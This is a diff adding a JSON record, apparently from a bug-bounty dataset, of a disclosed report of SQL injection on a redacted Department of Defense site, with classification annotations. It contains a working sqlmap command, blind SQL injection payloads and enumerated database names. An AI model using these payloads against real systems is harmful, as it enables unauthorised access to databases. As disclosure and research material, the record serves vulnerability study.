@@ -1,0 +1,42 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "malcolmx ",
+    "title": "SQL injection at [https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588] [HtUS]",
+    "content": "\nHello,\nSummary\nwhile doing test on www.\u2588\u2588\u2588 I\u2019ve found that the endpoint at /olc/\u2588\u2588\u2588comments/comment_post.php is vulnerable with SQL injection vulnerability\nVulnerable parameters\nstaff_student\nPOC\nusing sqlmap run command\nCode 271 Bytes\n1python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent  -u \"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\" --data=\"staff_student=STUDENT&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit+Comments\" -p staff_student --dbms=mysql \nwe can see that the target parameter is vulnerable\nCode 865 Bytes\n1POST parameter 'staff_student' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n\n2sqlmap identified the following injection point(s) with a total of 103 HTTP(s) requests:\n3---\n4Parameter: staff_student (POST)\n5    Type: boolean-based blind\n6    Title: AND boolean-based blind - WHERE or HAVING clause\n7    Payload: staff_student=STUDENT'||(SELECT 0x6545736f FROM DUAL WHERE 6919=6919 AND 4128=4128)||'&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit Comments\n8\n9    Type: time-based blind\n10    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n11    Payload: staff_student=STUDENT'||(SELECT 0x615a636e FROM DUAL WHERE 7192=7192 AND (SELECT 4865 FROM (SELECT(SLEEP(5)))VDbe))||'&scn=xxx&check25=0&check20=0&check20=1&check26=0&check27=0&check29=0&check24=0&comments=xx&Submit=Submit Comments\n{F1810520}\nadd --dbs we can see the sqlmap will start get the DBS\nCode 179 Bytes\n1available databases [13]:\n2[] \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3[] \u2588\u2588\u2588\u2588\u2588\u2588mobile\n4[] GET\n5[] information_schema\n6[] LEAM\n7[] leat\n8[] LEV\n9[] mysql\n10[] performance_schema\n11[] SET\n12[] test\n13[] testadmin\n14[*] testusers\n{F1810521}\nImpact\nattacker is able to get the database\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "SQL Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1663203840,
+    "report_url": "https://hackerone.com/reports/1627995",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Identify the vulnerable endpoint at /olc/\u2588\u2588\u2588comments/comment_post.php"
+        ],
+        [
+            2,
+            "Use sqlmap with the provided command to test the 'staff_student' parameter for SQL injection vulnerabilities"
+        ]
+    ],
+    "vuln_description": "The endpoint at /olc/\u2588\u2588\u2588comments/comment_post.php is vulnerable to SQL injection via the 'staff_student' parameter. This allows an attacker to execute arbitrary SQL queries, potentially leading to unauthorized database access.",
+    "reason": "The vulnerability was discovered using automated tools (sqlmap) with standard parameters, indicating a straightforward discovery process. The attack does not involve complex interactions or novel logic.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "authnz_metadata": {
+        "reason": "The SQL injection vulnerability involves direct manipulation of database queries through input parameters, which is a different class of vulnerability from the authentication and authorization bypasses (AuthN/AuthZ) or Insecure Direct Object References (IDOR) that the proposed methodologies aim to detect. The methodologies focus on swapping user sessions or resource IDs to test authorization boundaries, not on injecting malicious SQL payloads.",
+        "is_detectable": false
+    }
+}
